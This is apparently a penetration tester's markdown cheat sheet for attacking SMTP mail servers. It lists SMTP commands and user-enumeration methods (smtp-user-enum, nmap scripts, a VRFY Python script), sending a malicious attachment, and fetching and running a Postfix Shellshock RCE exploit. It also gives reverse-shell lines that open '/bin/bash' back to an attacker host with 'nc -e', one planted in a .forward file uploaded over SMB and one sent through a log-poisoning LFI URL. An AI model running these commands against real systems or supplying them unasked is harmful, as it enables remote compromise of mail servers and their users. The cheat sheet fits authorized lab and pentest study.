### SMTP Commands

|**Command**|**Description**|
|---|---|
|`AUTH PLAIN`|AUTH is a service extension used to authenticate the client.|
|`HELO`|The client logs in with its computer name and thus starts the session.|
|`MAIL FROM`|The client names the email sender.|
|`RCPT TO`|The client names the email recipient.|
|`DATA`|The client initiates the transmission of the email.|
|`RSET`|The client aborts the initiated transmission but keeps the connection between client and server.|
|`VRFY`|The client checks if a mailbox is available for message transfer.|
|`EXPN`|The client also checks if a mailbox is available for messaging with this command.|
|`NOOP`|The client requests a response from the server to prevent disconnection due to time-out.|
|`QUIT`|The client terminates the session.|

#### send email with sendemail
```bash - kali
sendemail -f 'jonas@localhost' \
   -t 'mailadmin@localhost' \
   -s 192.168.120.132:25 \
   -u 'Your spreadsheet' \
   -m 'Here is your requested spreadsheet' \
   -a bomb.ods
```

#### Postfix SMTP Linux Shellshock RCE - USERNAME NEEDED
```bash - kali
wget https://raw.githubusercontent.com/3mrgnc3/pentest_old/master/postfix-shellshock-nc.py
```

[[1._rlwrap]]

```bash - kali
python postfix-shellshock-nc.py $TARGET $USER $KALI 443
```

#### User enumeration tool
```bash - kali
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $TARGET | grep exists | awk '{print $2}' > users
```

#### nmap
```bash - kali
nmap --script smtp-commands.nse -pT:25 $TARGET
```

```bash 
sudo nmap $TARGET -p25 --script smtp-open-relay -v
```


#### Mail forward RCE
Found a .forward file in user's directory by SMB.

`/usr/bin/procmail -f-`

```bash - kali
echo "|nc $KALI 443 -e /bin/bash" > .forward
```

![[rlwrap]]

```bash - kali
smbclient \\\\$TARGET\\<SHARE> -U "<USER>%<PASSWORD>"
```

```bash - kali
put .forward
```

```bash - kali
exit
```

#### Send mail with netcat
```bash - kali
nc $TARGET 25
```

```bash - kali
HELO hacker
```

```bash - kali
mail from:<USER@localhost>
```
OR
```bash - kali
mail from:hacker@example.org
```

```bash - kali
rcpt to:<USER@HOST>
```
EXAMPLE : `RCPT TO:lhale@victim`

```bash - kali
DATA
```

Insert email body

```bash - kali
.
```

```bash - kali
QUIT
```

####  Log Poisoning 
symfonos vulnhub - https://0xw0lf.github.io/2020/03/08/Vulnhub-Symfonos1/
LFI to RCE - https://liberty-shell.com/sec/2018/05/19/poisoning/

>......campaign/count_of_send.php?pl=/var/mail/helios&cmd=nc%20-e%20/bin/bash%20$KALI%20443


#### User verification script

Usage 
```bash
python3 vrfy.py userlist.txt output.txt
```

```python 3
import socket
import sys

if len(sys.argv) != 3:
    print("Usage: vrfy.py <userlist.txt> <output.txt>")
    sys.exit(0)

# Input and output file names
user_list_file = sys.argv[1]
output_file = sys.argv[2]

# Read the list of users from the file
try:
    with open(user_list_file, 'r') as file:
        users = file.readlines()
except FileNotFoundError:
    print(f"Error: File '{user_list_file}' not found.")
    sys.exit(1)

# Open the output file in write mode
try:
    with open(output_file, 'w') as outfile:
        for user in users:
            user = user.strip()  # Remove any leading/trailing whitespace or newline characters
            if user:  # Skip empty lines
                try:
                    # Create a new socket for each user
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect(("10.129.16.13", 25))

                    # Receive the banner
                    banner = s.recv(1024)
                    outfile.write(f"Banner: {banner.decode('utf-8')}\n")  # Write banner to output file

                    # Send VRFY command
                    s.send(('VRFY ' + user + '\r\n').encode('utf-8'))  # Encode string to bytes
                    result = s.recv(1024)
                    result_decoded = result.decode('utf-8')
                    print(f"VRFY {user}: {result_decoded}")  # Print result
                    outfile.write(f"VRFY {user}: {result_decoded}\n")  # Write result to output file

                    # Close the socket
                    s.close()

                except Exception as e:
                    error_message = f"Error verifying {user}: {e}"
                    print(error_message)  # Print error
                    outfile.write(error_message + "\n")  # Write error to output file

except Exception as e:
    print(f"Error writing to output file '{output_file}': {e}")
    sys.exit(1)
```
